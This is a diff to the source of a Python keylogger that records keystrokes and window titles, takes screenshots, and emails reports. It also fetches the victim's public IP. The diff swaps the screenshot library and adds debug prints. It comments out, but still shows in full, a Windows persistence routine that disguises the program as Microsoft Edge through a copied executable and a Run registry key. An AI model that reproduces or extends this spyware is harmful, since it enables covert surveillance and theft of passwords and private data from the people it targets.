@@ -18,8 +18,10 @@ import shutil
 import requests
 import getpass
 from sys import executable
+import sys
 import platform
 import subprocess
+from PIL import ImageGrab
 
 REPORT_INTERVAL = 20
 POLLING_INTERVAL = 10
@@ -44,13 +46,16 @@ def key_callback(event : keyboard.KeyboardEvent):
 
     if new_window != curr_window:
         curr_window = new_window
-        image = pyscreenshot.grab()
+
+        # image = pyscreenshot.grab()
+        image = ImageGrab.grab()
         total_screenshots = len(os.listdir(screenshots_folder))
         image.save(rf"{screenshots_folder}\image_{total_screenshots}.png")
         screenshot_line = f" | Screenshot taken: image_{total_screenshots}.png"
 
     log_line += f"Key: {event.name} | "
     log_line += f"{curr_window} | "
+
 
     dt = datetime.datetime.fromtimestamp(event.time)
     log_line += f"{dt}"
@@ -72,6 +77,7 @@ def attach_file(msg, filepath):
     msg.attach(part)
 
 def send_report():
+    print("Trying to send report")
     try:
         if os.listdir(screenshots_folder):
             print("Sending report")
@@ -121,20 +127,23 @@ def check_flag():
     poller.start()
 
 def setup():
+    print("setting up")
     if not os.path.exists(working_folder):
+        print("making working folder")
         os.mkdir(working_folder)
 
     if not os.path.exists(screenshots_folder):
+        print("making screenshots folder")
         os.mkdir(screenshots_folder)
 
     # setup persistence 
 
-    os_type = platform.system()
-    if os_type == "Windows":
-        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
-        if not os.path.exists(location):
-            shutil.copyfile(executable, location)
-            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    # os_type = platform.system()
+    # if os_type == "Windows":
+    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+    #     if not os.path.exists(location):
+    #         shutil.copyfile(executable, location)
+    #         subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
@@ -152,6 +161,7 @@ def setup():
 
 def cleanup():
     print("Cleaning up")
+    sys.exit(0)
 
 def main():
     setup()
